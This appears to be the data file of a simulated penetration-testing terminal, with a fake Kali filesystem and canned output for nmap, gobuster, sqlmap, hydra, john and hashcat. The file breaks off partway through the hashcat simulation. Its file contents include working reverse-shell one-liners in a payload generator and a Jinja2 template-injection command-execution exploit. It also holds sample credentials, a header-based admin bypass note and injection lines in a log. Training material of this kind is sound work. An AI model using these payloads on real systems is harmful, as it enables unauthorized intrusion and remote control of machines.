//  terminalData.ts — The brain of the ShellStack Terminal

export interface FSNode {
  type: 'file' | 'dir';
  children?: Record<string, FSNode>;
  content?: string;
  permissions?: string;
  size?: string;
}

export const filesystem: Record<string, FSNode> = {
  home: {
    type: 'dir',
    children: {
      kali: {
        type: 'dir',
        children: {
          targets: {
            type: 'dir',
            children: {
              'scope.txt': {
                type: 'file',
                content: '# Authorized Targets — Engagement #4471\n192.168.1.0/24\n10.10.10.0/24\nhttps://target-app.local\nhttps://staging.target-app.local\n\n# Out of Scope:\n*.prod.target-app.com\n172.16.0.0/16',
                permissions: '-rw-r--r--',
                size: '198',
              },
              'creds.txt': {
                type: 'file',
                content: 'admin:$6$rounds=5000$salt$hashed_password_here\nroot:$6$xYzABC$LongHashedStringHere1234567890abcdef\nguest:guest123\ndb_admin:Passw0rd!2024\nbackup_svc:b4ckup_S3cur3!',
                permissions: '-rw-------',
                size: '247',
              },
              'recon-notes.md': {
                type: 'file',
                content: '# Recon Notes — 2024-01-15\n\n## Target: 192.168.1.1\n- Apache/2.4.52 on port 80\n- OpenSSH 8.9p1 on port 22\n- MySQL 8.0 on port 3306 (internal only)\n- /admin returns 403 (possible bypass?)\n- /api/v1/users returns 200 (IDOR likely)\n\n## DNS Findings\n- mail.target-app.local → 192.168.1.5\n- dev.target-app.local → 192.168.1.10 (exposed!)\n- staging.target-app.local → 192.168.1.11\n\n## Next Steps\n1. Run Nikto against /admin\n2. Test IDOR on /api/v1/users\n3. Enumerate MySQL with default creds',
                permissions: '-rw-r--r--',
                size: '512',
              },
            },
          },
          tools: {
            type: 'dir',
            children: {
              'custom-scanner.py': {
                type: 'file',
                content: '#!/usr/bin/env python3\n"""Custom vulnerability scanner — ShellStack Edition"""\nimport socket\nimport threading\nfrom queue import Queue\n\ndef scan_port(target, port):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(1)\n        result = s.connect_ex((target, port))\n        if result == 0:\n            print(f"[+] Port {port}: OPEN")\n        s.close()\n    except:\n        pass\n\nif __name__ == "__main__":\n    target = input("Target IP: ")\n    for port in range(1, 1025):\n        scan_port(target, port)',
                permissions: '-rwxr-xr-x',
                size: '478',
              },
              'payload.sh': {
                type: 'file',
                content: '#!/bin/bash\n# Reverse shell payload generator\n# Usage: ./payload.sh <LHOST> <LPORT>\n\nLHOST=$1\nLPORT=$2\n\necho "[*] Generating payloads for $LHOST:$LPORT"\necho ""\necho "=== Bash ===" \necho "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"\necho ""\necho "=== Python ==="\necho "python3 -c \'import socket,os,pty;s=socket.socket();s.connect((\"$LHOST\",$LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")\'"\necho ""\necho "=== Netcat ==="\necho "nc -e /bin/bash $LHOST $LPORT"',
                permissions: '-rwxr-xr-x',
                size: '502',
              },
            },
          },
          loot: {
            type: 'dir',
            children: {
              'hashes.txt': {
                type: 'file',
                content: '# Dumped from target MySQL — 2024-01-15\nadmin:$2b$12$LJ3m4ys8Kk/W3x5u1nZ0V.kXbN6/Q3pG4w7vYZ1dC5r7s9tA0bC\nuser1:$2b$12$Xm9p7Rs2Tk/Y4z6v2oA1W.lYcO7/R4qH5x8wZA2eD6s8t0uB1dD\nuser2:$2b$12$Mn0q8St3Ul/Z5a7w3pB2X.mZdP8/S5rI6y9xAB3fE7t9u1vC2eE\ntest:$1$salt$DFGhjk89012345abcdef\nbackup:$6$rounds=5000$saltsalt$ABCDefgh1234567890ijklmnop',
                permissions: '-rw-------',
                size: '389',
              },
              'screenshot-admin-panel.txt': {
                type: 'file',
                content: '[Screenshot saved as PNG — 1920x1080]\nTarget: https://target-app.local/admin\nTimestamp: 2024-01-15 14:32:07 UTC\nNote: Admin panel accessible without authentication after bypassing 403 via X-Forwarded-For: 127.0.0.1 header',
                permissions: '-rw-r--r--',
                size: '253',
              },
            },
          },
          '.bashrc': {
            type: 'file',
            content: '# ~/.bashrc: executed by bash for non-login shells.\nexport PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"\nexport PS1="\\[\\033[01;32m\\]kali@shellstack\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ "\nalias ll="ls -la"\nalias la="ls -A"\nalias l="ls -CF"\nalias cls="clear"\nalias update="sudo apt update && sudo apt upgrade -y"\nalias ports="netstat -tulanp"',
            permissions: '-rw-r--r--',
            size: '412',
          },
          '.ssh': {
            type: 'dir',
            children: {
              'id_rsa.pub': {
                type: 'file',
                content: 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQD... kali@shellstack',
                permissions: '-rw-r--r--',
                size: '742',
              },
              'known_hosts': {
                type: 'file',
                content: '192.168.1.1 ecdsa-sha2-nistp256 AAAA...\n10.10.10.5 ssh-ed25519 AAAA...\ngithub.com ssh-rsa AAAA...',
                permissions: '-rw-r--r--',
                size: '412',
              },
            },
          },
        },
      },
    },
  },
  etc: {
    type: 'dir',
    children: {
      'passwd': {
        type: 'file',
        content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false\nsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin',
        permissions: '-rw-r--r--',
        size: '487',
      },
      'shadow': {
        type: 'file',
        content: '[Permission denied] — Run with sudo to read this file.',
        permissions: '-rw-r-----',
        size: '892',
      },
      'hostname': {
        type: 'file',
        content: 'shellstack',
        permissions: '-rw-r--r--',
        size: '11',
      },
      hosts: {
        type: 'file',
        content: '127.0.0.1\tlocalhost\n127.0.1.1\tshellstack\n192.168.1.1\ttarget-router\n192.168.1.10\tdev.target-app.local\n192.168.1.11\tstaging.target-app.local\n10.10.10.5\tctf-box.htb\n\n# The following lines are desirable for IPv6 capable hosts\n::1     localhost ip6-localhost ip6-loopback',
        permissions: '-rw-r--r--',
        size: '315',
      },
    },
  },
  var: {
    type: 'dir',
    children: {
      log: {
        type: 'dir',
        children: {
          'auth.log': {
            type: 'file',
            content: 'Jan 15 14:20:01 shellstack sshd[1234]: Failed password for root from 10.10.10.99 port 44231 ssh2\nJan 15 14:20:03 shellstack sshd[1234]: Failed password for root from 10.10.10.99 port 44231 ssh2\nJan 15 14:20:05 shellstack sshd[1234]: Failed password for root from 10.10.10.99 port 44231 ssh2\nJan 15 14:20:07 shellstack sshd[1234]: Connection closed by 10.10.10.99 port 44231\nJan 15 14:25:12 shellstack sshd[1240]: Accepted publickey for kali from 192.168.1.100 port 52341 ssh2\nJan 15 14:25:12 shellstack sshd[1240]: pam_unix(sshd:session): session opened for user kali',
            permissions: '-rw-r-----',
            size: '623',
          },
          'apache2': {
            type: 'dir',
            children: {
              'access.log': {
                type: 'file',
                content: '192.168.1.50 - - [15/Jan/2024:14:30:01 +0000] "GET / HTTP/1.1" 200 3421\n192.168.1.50 - - [15/Jan/2024:14:30:02 +0000] "GET /admin HTTP/1.1" 403 276\n192.168.1.50 - - [15/Jan/2024:14:30:05 +0000] "GET /api/v1/users HTTP/1.1" 200 8934\n192.168.1.50 - - [15/Jan/2024:14:30:08 +0000] "POST /login HTTP/1.1" 302 0\n10.10.10.99 - - [15/Jan/2024:14:31:00 +0000] "GET /../../etc/passwd HTTP/1.1" 400 301\n10.10.10.99 - - [15/Jan/2024:14:31:02 +0000] "GET /admin\' OR 1=1-- HTTP/1.1" 500 0',
                permissions: '-rw-r-----',
                size: '567',
              },
            },
          },
        },
      },
      www: {
        type: 'dir',
        children: {
          html: {
            type: 'dir',
            children: {
              'index.html': {
                type: 'file',
                content: '<!DOCTYPE html>\n<html>\n<head><title>Welcome</title></head>\n<body>\n  <h1>Welcome to Target App</h1>\n  <p>Version 2.1.0</p>\n  <!-- TODO: Remove debug endpoint before production -->\n  <!-- /api/debug?cmd= -->\n</body>\n</html>',
                permissions: '-rw-r--r--',
                size: '237',
              },
            },
          },
        },
      },
    },
  },
  usr: {
    type: 'dir',
    children: {
      share: {
        type: 'dir',
        children: {
          wordlists: {
            type: 'dir',
            children: {
              'rockyou.txt': {
                type: 'file',
                content: '[14,344,391 lines — 139MB compressed]\nTop 10 entries:\n123456\npassword\n12345678\nqwerty\n123456789\n12345\n1234\n111111\n1234567\ndragon',
                permissions: '-rw-r--r--',
                size: '139M',
              },
              dirb: {
                type: 'dir',
                children: {
                  'common.txt': {
                    type: 'file',
                    content: '[4,614 lines]\nSample entries:\nadmin\nbackup\ncgi-bin\nconfig\ncss\ndata\ndb\nimages\njs\nlogin\nuploads\napi',
                    permissions: '-rw-r--r--',
                    size: '36K',
                  },
                },
              },
            },
          },
        },
      },
    },
  },
  tmp: {
    type: 'dir',
    children: {
      'exploit.py': {
        type: 'file',
        content: '#!/usr/bin/env python3\n# CVE-2024-XXXX PoC Exploit\n# Author: ShellStack Research\nimport requests\nimport sys\n\ndef exploit(target, cmd):\n    payload = f"{{{{.__class__.__mro__[1].__subclasses__()[407](\\"{cmd}\\", shell=True, stdout=-1).communicate()[0]}}}}"\n    r = requests.get(f"{target}/page?template={payload}")\n    return r.text\n\nif __name__ == "__main__":\n    print(exploit(sys.argv[1], sys.argv[2]))',
        permissions: '-rwxr-xr-x',
        size: '412',
      },
    },
  },
};

// ── Tool Output Simulations ─────────────────────────────────

export interface OutputLine {
  text: string;
  color?: 'green' | 'cyan' | 'yellow' | 'red' | 'white' | 'dim' | 'blue' | 'magenta';
  delay?: number; // extra ms delay after this line
}

export interface ToolSimulation {
  name: string;
  aliases?: string[];
  description: string;
  category: string;
  getOutput: (args: string) => OutputLine[];
}

const nmapSim: ToolSimulation = {
  name: 'nmap',
  description: 'Network exploration tool and security scanner',
  category: 'Reconnaissance',
  getOutput: (args: string) => {
    const target = args.trim().split(/\s+/).pop() || '192.168.1.1';
    return [
      { text: '', delay: 200 },
      { text: `Starting Nmap 7.94SVN ( https://nmap.org ) at ${new Date().toISOString().split('T')[0]}`, color: 'dim' },
      { text: `Nmap scan report for ${target}`, color: 'white', delay: 400 },
      { text: `Host is up (0.0023s latency).`, color: 'green' },
      { text: 'Not shown: 993 closed tcp ports (reset)', color: 'dim', delay: 300 },
      { text: '', delay: 100 },
      { text: 'PORT      STATE SERVICE       VERSION', color: 'yellow' },
      { text: '22/tcp    open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.1', color: 'white' },
      { text: '| ssh-hostkey:', color: 'dim' },
      { text: '|   256 a6:3e:01:b4:c7:8f:2d:9e:5a:0b:7c:4d:8f:1a:3b:5c (ECDSA)', color: 'dim' },
      { text: '|_  256 b7:4f:02:c5:d8:9a:3e:0f:6b:1c:8d:5e:2a:4b:7d:9f (ED25519)', color: 'dim' },
      { text: '53/tcp    open  domain        ISC BIND 9.18.12-1', color: 'white' },
      { text: '80/tcp    open  http          Apache httpd 2.4.52 ((Ubuntu))', color: 'white' },
      { text: '|_http-title: Welcome to Target App', color: 'dim' },
      { text: '|_http-server-header: Apache/2.4.52 (Ubuntu)', color: 'dim' },
      { text: '139/tcp   open  netbios-ssn   Samba smbd 4.6.2', color: 'white' },
      { text: '443/tcp   open  ssl/http      Apache httpd 2.4.52', color: 'white' },
      { text: '| ssl-cert: Subject: commonName=target-app.local', color: 'dim' },
      { text: '445/tcp   open  microsoft-ds  Samba smbd 4.6.2', color: 'white' },
      { text: '3306/tcp  open  mysql         MySQL 8.0.32-0ubuntu0.22.04.2', color: 'white' },
      { text: '| mysql-info:', color: 'dim' },
      { text: '|   Protocol: 10', color: 'dim' },
      { text: '|   Version: 8.0.32-0ubuntu0.22.04.2', color: 'dim' },
      { text: '', delay: 200 },
      { text: 'MAC Address: 08:00:27:1A:2B:3C (Oracle VirtualBox virtual NIC)', color: 'dim' },
      { text: 'Device type: general purpose', color: 'dim' },
      { text: 'Running: Linux 5.X|6.X', color: 'white' },
      { text: 'OS CPE: cpe:/o:linux:linux_kernel:5.15 cpe:/o:linux:linux_kernel:6', color: 'dim' },
      { text: 'OS details: Linux 5.15 - 6.2', color: 'white' },
      { text: '', delay: 100 },
      { text: 'TRACEROUTE', color: 'yellow' },
      { text: 'HOP RTT     ADDRESS', color: 'dim' },
      { text: `1   2.31 ms ${target}`, color: 'white' },
      { text: '', delay: 200 },
      { text: `OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .`, color: 'dim' },
      { text: `Nmap done: 1 IP address (1 host up) scanned in 14.27 seconds`, color: 'green' },
    ];
  },
};

const gobusterSim: ToolSimulation = {
  name: 'gobuster',
  description: 'Directory/file & DNS brute-forcing tool',
  category: 'Web',
  getOutput: (args: string) => {
    const urlMatch = args.match(/-u\s+(\S+)/);
    const url = urlMatch ? urlMatch[1] : 'http://target.com';
    return [
      { text: '===============================================================', color: 'cyan' },
      { text: 'Gobuster v3.6', color: 'cyan' },
      { text: 'by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)', color: 'cyan' },
      { text: '===============================================================', color: 'cyan' },
      { text: `[+] Url:                     ${url}`, color: 'white' },
      { text: '[+] Method:                  GET', color: 'white' },
      { text: '[+] Threads:                 10', color: 'white' },
      { text: '[+] Wordlist:                /usr/share/wordlists/dirb/common.txt', color: 'white' },
      { text: '[+] Negative Status codes:   404', color: 'white' },
      { text: '[+] User Agent:              gobuster/3.6', color: 'white' },
      { text: '[+] Timeout:                 10s', color: 'white' },
      { text: '===============================================================', color: 'cyan' },
      { text: 'Starting gobuster in directory enumeration mode', color: 'yellow', delay: 300 },
      { text: '===============================================================', color: 'cyan' },
      { text: '/admin                (Status: 403) [Size: 276]', color: 'red', delay: 80 },
      { text: '/api                  (Status: 301) [Size: 310] [--> /api/]', color: 'green', delay: 60 },
      { text: '/assets               (Status: 301) [Size: 313] [--> /assets/]', color: 'green', delay: 90 },
      { text: '/backup               (Status: 301) [Size: 313] [--> /backup/]', color: 'green', delay: 70 },
      { text: '/cgi-bin              (Status: 403) [Size: 276]', color: 'red', delay: 100 },
      { text: '/config               (Status: 403) [Size: 276]', color: 'red', delay: 50 },
      { text: '/css                  (Status: 301) [Size: 310] [--> /css/]', color: 'green', delay: 60 },
      { text: '/dashboard            (Status: 302) [Size: 0] [--> /login]', color: 'yellow', delay: 80 },
      { text: '/debug                (Status: 200) [Size: 4521]', color: 'green', delay: 40 },
      { text: '/images               (Status: 301) [Size: 313] [--> /images/]', color: 'green', delay: 70 },
      { text: '/js                   (Status: 301) [Size: 309] [--> /js/]', color: 'green', delay: 50 },
      { text: '/login                (Status: 200) [Size: 1523]', color: 'green', delay: 60 },
      { text: '/phpmyadmin           (Status: 200) [Size: 8742]', color: 'green', delay: 90 },
      { text: '/robots.txt           (Status: 200) [Size: 89]', color: 'green', delay: 40 },
      { text: '/server-status        (Status: 403) [Size: 276]', color: 'red', delay: 80 },
      { text: '/uploads              (Status: 301) [Size: 314] [--> /uploads/]', color: 'green', delay: 70 },
      { text: '', delay: 200 },
      { text: '===============================================================', color: 'cyan' },
      { text: 'Finished', color: 'green' },
      { text: '===============================================================', color: 'cyan' },
      { text: '', color: 'dim' },
      { text: `[!] Notable: /debug endpoint found (200) — possible information disclosure`, color: 'yellow' },
      { text: `[!] Notable: /phpmyadmin found — database management exposed`, color: 'red' },
    ];
  },
};

const sqlmapSim: ToolSimulation = {
  name: 'sqlmap',
  description: 'Automatic SQL injection and database takeover tool',
  category: 'Web',
  getOutput: (args: string) => {
    const urlMatch = args.match(/-u\s+"?(\S+)"?/);
    const url = urlMatch ? urlMatch[1].replace(/"/g, '') : 'http://target.com/page.php?id=1';
    return [
      { text: '        ___', color: 'red' },
      { text: '       __H__', color: 'red' },
      { text: " ___ ___[']_____ ___ ___  {1.8.2#stable}", color: 'red' },
      { text: "|_ -| . [.]     | .'| . |", color: 'red' },
      { text: "|___|_  [']_|_|_|__,|  _|", color: 'red' },
      { text: '      |_|V...       |_|   https://sqlmap.org', color: 'red' },
      { text: '', delay: 300 },
      { text: '[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal.', color: 'yellow' },
      { text: '', delay: 200 },
      { text: `[*] starting @ ${new Date().toTimeString().split(' ')[0]}`, color: 'dim' },
      { text: '', delay: 150 },
      { text: `[INFO] testing connection to the target URL`, color: 'cyan', delay: 200 },
      { text: `[INFO] checking if the target is protected by some kind of WAF/IPS`, color: 'cyan', delay: 300 },
      { text: `[INFO] testing if the target URL content is stable`, color: 'cyan', delay: 200 },
      { text: `[INFO] target URL content is stable`, color: 'green', delay: 150 },
      { text: `[INFO] testing if GET parameter 'id' is dynamic`, color: 'cyan', delay: 200 },
      { text: `[WARNING] GET parameter 'id' does not appear to be dynamic`, color: 'yellow', delay: 100 },
      { text: `[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')`, color: 'green', delay: 300 },
      { text: `[INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks`, color: 'yellow', delay: 200 },
      { text: `[INFO] testing for SQL injection on GET parameter 'id'`, color: 'cyan', delay: 250 },
      { text: `[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'`, color: 'cyan', delay: 200 },
      { text: `[INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable`, color: 'green', delay: 300 },
      { text: `[INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'`, color: 'cyan', delay: 200 },
      { text: `[INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based' injectable`, color: 'green', delay: 200 },
      { text: `[INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'`, color: 'cyan', delay: 400 },
      { text: `[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable`, color: 'green', delay: 200 },
      { text: `[INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'`, color: 'cyan', delay: 300 },
      { text: `[INFO] target URL appears to have 5 columns in query`, color: 'green', delay: 200 },
      { text: '', delay: 100 },
      { text: `[INFO] the back-end DBMS is MySQL`, color: 'green' },
      { text: `web application technology: Apache 2.4.52, PHP 8.1.2`, color: 'white' },
      { text: `back-end DBMS: MySQL >= 5.0 (MariaDB fork)`, color: 'white' },
      { text: '', delay: 200 },
      { text: `[INFO] fetching database names`, color: 'cyan', delay: 300 },
      { text: `available databases [5]:`, color: 'green' },
      { text: `[*] information_schema`, color: 'white' },
      { text: `[*] mysql`, color: 'white' },
      { text: `[*] performance_schema`, color: 'white' },
      { text: `[*] sys`, color: 'white' },
      { text: `[*] target_webapp`, color: 'green' },
      { text: '', delay: 200 },
      { text: `[INFO] fetched data logged to: /home/kali/.local/share/sqlmap/output/${url.split('//')[1]?.split('/')[0] || 'target.com'}`, color: 'dim' },
      { text: `[*] ending @ ${new Date().toTimeString().split(' ')[0]}`, color: 'dim' },
    ];
  },
};

const niktoSim: ToolSimulation = {
  name: 'nikto',
  description: 'Web server scanner which performs comprehensive tests',
  category: 'Web',
  getOutput: (args: string) => {
    const hostMatch = args.match(/-h\s+(\S+)/);
    const host = hostMatch ? hostMatch[1] : 'http://target.com';
    return [
      { text: `- Nikto v2.5.0`, color: 'cyan' },
      { text: '───────────────────────────────────────────────', color: 'dim' },
      { text: `+ Target IP:          192.168.1.1`, color: 'white' },
      { text: `+ Target Hostname:    ${host.replace(/https?:\/\//, '')}`, color: 'white' },
      { text: `+ Target Port:        80`, color: 'white' },
      { text: `+ Start Time:         ${new Date().toISOString()}`, color: 'dim' },
      { text: '───────────────────────────────────────────────', color: 'dim', delay: 300 },
      { text: `+ Server: Apache/2.4.52 (Ubuntu)`, color: 'white' },
      { text: `+ /: The anti-clickjacking X-Frame-Options header is not present.`, color: 'yellow', delay: 100 },
      { text: `+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type.`, color: 'yellow', delay: 80 },
      { text: `+ /: Cookie PHPSESSID created without the httponly flag.`, color: 'red', delay: 100 },
      { text: `+ Apache/2.4.52 appears to be outdated (current is at least 2.4.58).`, color: 'yellow', delay: 80 },
      { text: `+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .`, color: 'white', delay: 60 },
      { text: `+ /admin/: Directory indexing found.`, color: 'red', delay: 100 },
      { text: `+ /admin/: This might be interesting... has been seen in web logs from an idealized scanner.`, color: 'yellow', delay: 80 },
      { text: `+ /config/: Directory indexing found.`, color: 'red', delay: 100 },
      { text: `+ /config/database.yml: Configuration file found.`, color: 'red', delay: 80 },
      { text: `+ /icons/README: Apache default file found.`, color: 'yellow', delay: 60 },
      { text: `+ /login.php: Admin login page/section found.`, color: 'yellow', delay: 80 },
      { text: `+ /phpmyadmin/: phpMyAdmin directory found.`, color: 'red', delay: 100 },
      { text: `+ /.git/HEAD: Git repository found.`, color: 'red', delay: 120 },
      { text: `+ /.env: Environment configuration file found. May contain credentials.`, color: 'red', delay: 100 },
      { text: '───────────────────────────────────────────────', color: 'dim' },
      { text: `+ ${14} host(s) tested`, color: 'dim' },
      { text: `+ ${16} item(s) reported on remote host`, color: 'green' },
      { text: `+ End Time:           ${new Date().toISOString()}`, color: 'dim' },
      { text: '───────────────────────────────────────────────', color: 'dim' },
    ];
  },
};

const hydraSim: ToolSimulation = {
  name: 'hydra',
  description: 'Password cracking tool for network services',
  category: 'Password Attacks',
  getOutput: (args: string) => {
    const target = args.trim().split(/\s+/).pop() || '192.168.1.1';
    return [
      { text: `Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak`, color: 'cyan' },
      { text: '', delay: 200 },
      { text: `Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at ${new Date().toTimeString().split(' ')[0]}`, color: 'dim' },
      { text: `[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries`, color: 'white' },
      { text: `[DATA] attacking ssh://${target}:22/`, color: 'white', delay: 300 },
      { text: `[STATUS] 128.00 tries/min, 128 tries in 00:01h, 14344271 to do in 1868:29h`, color: 'dim', delay: 200 },
      { text: `[STATUS] 134.67 tries/min, 404 tries in 00:03h, 14343995 to do in 1775:25h`, color: 'dim', delay: 200 },
      { text: `[22][ssh] host: ${target}   login: admin   password: P@ssw0rd2024!`, color: 'green', delay: 400 },
      { text: `[STATUS] attack finished for ${target} (valid pair found)`, color: 'green' },
      { text: '', delay: 100 },
      { text: `1 of 1 target successfully completed, 1 valid password found`, color: 'green' },
      { text: `Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at ${new Date().toTimeString().split(' ')[0]}`, color: 'dim' },
    ];
  },
};

const metasploitSim: ToolSimulation = {
  name: 'msfconsole',
  aliases: ['msf', 'metasploit'],
  description: 'The Metasploit Framework console',
  category: 'Exploitation',
  getOutput: () => [
    { text: '', delay: 200 },
    { text: '                                                  ', color: 'dim' },
    { text: '  ______________________________________________  ', color: 'red' },
    { text: ' |  METASPLOIT — Penetration Testing Framework  | ', color: 'red' },
    { text: ' |______________________________________________|  ', color: 'red' },
    { text: '', delay: 300 },
    { text: '       =[ metasploit v6.3.55-dev                ]', color: 'blue' },
    { text: '+ -- --=[ 2397 exploits - 1235 auxiliary - 422 post       ]', color: 'white' },
    { text: '+ -- --=[ 1391 payloads - 46 encoders - 11 nops          ]', color: 'white' },
    { text: '+ -- --=[ 9 evasion                                      ]', color: 'white' },
    { text: '', delay: 100 },
    { text: 'Metasploit Documentation: https://docs.metasploit.com/', color: 'dim' },
    { text: '', delay: 200 },
    { text: '[*] Starting persistent handler(s)...', color: 'cyan' },
    { text: '', delay: 100 },
    { text: '[msf6] > Metasploit Framework loaded. Type "help" for usage.', color: 'green' },
    { text: '', color: 'dim' },
    { text: '[TIP] Use "search" to find modules (e.g., search type:exploit platform:linux)', color: 'yellow' },
    { text: '[TIP] Use "use" followed by a module path to select a module', color: 'yellow' },
  ],
};

const johnSim: ToolSimulation = {
  name: 'john',
  aliases: ['john-the-ripper'],
  description: 'Password cracker',
  category: 'Password Attacks',
  getOutput: (args: string) => {
    const file = args.trim().split(/\s+/).pop() || 'hashes.txt';
    return [
      { text: `Using default input encoding: UTF-8`, color: 'dim' },
      { text: `Loaded 5 password hashes from ${file} with 5 different salts (bcrypt [Blowfish 32/64 X3])`, color: 'white', delay: 300 },
      { text: `Cost 1 (iteration count) is 4096 for all loaded hashes`, color: 'dim' },
      { text: `Will run 4 OpenMP threads`, color: 'dim' },
      { text: `Press 'q' or Ctrl-C to abort, almost any other key for status`, color: 'dim', delay: 200 },
      { text: ``, delay: 400 },
      { text: `password123      (user2)`, color: 'green', delay: 600 },
      { text: `admin2024        (admin)`, color: 'green', delay: 800 },
      { text: `iloveyou         (test)`, color: 'green', delay: 500 },
      { text: ``, delay: 200 },
      { text: `3g 0:00:02:34 3/3 0.01947g/s 28.05p/s 89.42c/s 89.42C/s password123..iloveyou`, color: 'dim' },
      { text: `Use the "--show" option to display all of the cracked passwords reliably`, color: 'yellow' },
      { text: `Session completed. ${3} passwords cracked, ${2} left.`, color: 'green' },
    ];
  },
};

const wpscanSim: ToolSimulation = {
  name: 'wpscan',
  description: 'WordPress security scanner',
  category: 'Web',
  getOutput: (args: string) => {
    const urlMatch = args.match(/--url\s+(\S+)/);
    const url = urlMatch ? urlMatch[1] : 'http://target.com';
    return [
      { text: '_______________________________________________________________', color: 'cyan' },
      { text: '         __          _______   _____', color: 'cyan' },
      { text: '         \\ \\        / /  __ \\ / ____|', color: 'cyan' },
      { text: '          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®', color: 'cyan' },
      { text: "           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\", color: 'cyan' },
      { text: '            \\  /\\  /  | |     ____) | (__| (_| | | | |', color: 'cyan' },
      { text: '             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|', color: 'cyan' },
      { text: '', delay: 200 },
      { text: '         WordPress Security Scanner by the WPScan Team', color: 'dim' },
      { text: '                         Version 3.8.25', color: 'dim' },
      { text: '_______________________________________________________________', color: 'cyan', delay: 300 },
      { text: '', delay: 200 },
      { text: `[+] URL: ${url}/`, color: 'green' },
      { text: `[+] Started: ${new Date().toISOString()}`, color: 'dim', delay: 200 },
      { text: '', delay: 100 },
      { text: '[+] WordPress version 5.9.3 identified (Insecure, released on 2022-04-05).', color: 'red' },
      { text: ' |  Found By: Meta Generator (Passive Detection)', color: 'dim' },
      { text: '', delay: 100 },
      { text: '[+] WordPress theme in use: flavor', color: 'green' },
      { text: ' |  Location: /wp-content/themes/flavor/', color: 'dim' },
      { text: ' |  Last Updated: 2023-01-15', color: 'dim' },
      { text: ' |  [!] The version is out of date, the latest version is 2.1.0', color: 'yellow' },
      { text: '', delay: 200 },
      { text: '[+] Enumerating All Plugins (via Aggressive Methods)', color: 'cyan', delay: 300 },
      { text: '[i] No plugins found.', color: 'dim' },
      { text: '', delay: 100 },
      { text: '[+] Enumerating Users (via Passive and Aggressive Methods)', color: 'cyan', delay: 300 },
      { text: '[i] User(s) Identified:', color: 'green' },
      { text: ' |  [+] admin', color: 'green' },
      { text: ' |  [+] editor', color: 'green' },
      { text: ' |  [+] backup_admin', color: 'green' },
      { text: '', delay: 100 },
      { text: '[+] Finished: 1 vulnerability found', color: 'yellow' },
      { text: '[+] Elapsed time: 00:00:12', color: 'dim' },
    ];
  },
};

const hashcatSim: ToolSimulation = {
  name: 'hashcat',
  description: 'Advanced password recovery utility',
  category: 'Password Attacks',
  getOutput: () => [
    { text: 'hashcat (v6.2.6) starting', color: 'white', delay: 200 },
    { text: '', delay: 100 },
    { text: 'OpenCL API (OpenCL 3.0 ) - Platform #1 [NVIDIA Corporation]', color: 'dim' },
    { text: '* Device #1: NVIDIA GeForce RTX 4090, 24564/24576 MB, 128MCU', color: 'white' },
    { text: '', delay: 200 },
    { text: 'Minimum password length supported by kernel: 0', color: 'dim' },
    { text: 'Maximum password length supported by kernel: 256', color: 'dim' },
    { text: '', delay: 300 },
    { text: 'Hashes: 5 digests; 5 unique digests, 5 unique salts', color: 'white' },
    { text: 'Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates', color: 'dim' },
    { text: '', delay: 200 },
    { text: 'Dictionary cache built:', color: 'dim' },
    { text: '* Filename..: /usr/share/wordlists/rockyou.txt', color: 'white' },
    { text: '* Passwords.: 14344392', color: 'white' },
    { text: '* Bytes.....: 139921507', color: 'dim' },
    { text: '* Keyspace..: 14344385', color: 'dim', delay: 300 },
    { text: '', delay: 200 },
    { text: '$2b$12$LJ3m4ys8Kk:admin2024', color: 'green', delay: 400 },
    { text: '$2b$12$Xm9p7Rs2Tk:password123', color: 'green', delay: 300 },
    { text: '$2b$12$Mn0q8St3Ul:iloveyou', color: 'green', delay: 500 },
    { text: '', delay: 200 },
    { text: 'Session..........: hashcat', color: 'dim' },
    { text: 'Status...........: Exhausted', color: 'yellow' },
    { text: 'Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))', color: 'white' },
    { text: 'Hash.Target......: hashes.txt', color: 'white' },
    { text: 'Time.Started.....: 2 mins ago', color: 'dim' },
    { text: 'Speed.#1.........: 28576 H/s (81.44ms) @ Accel:4 Loops:64 Thr:11 Vec:1', color: 'white' },
    { text: 'Recovered........: 3/5 (60.00%) Digests, 3/5 (60.00%) Salts', color: 'green' },
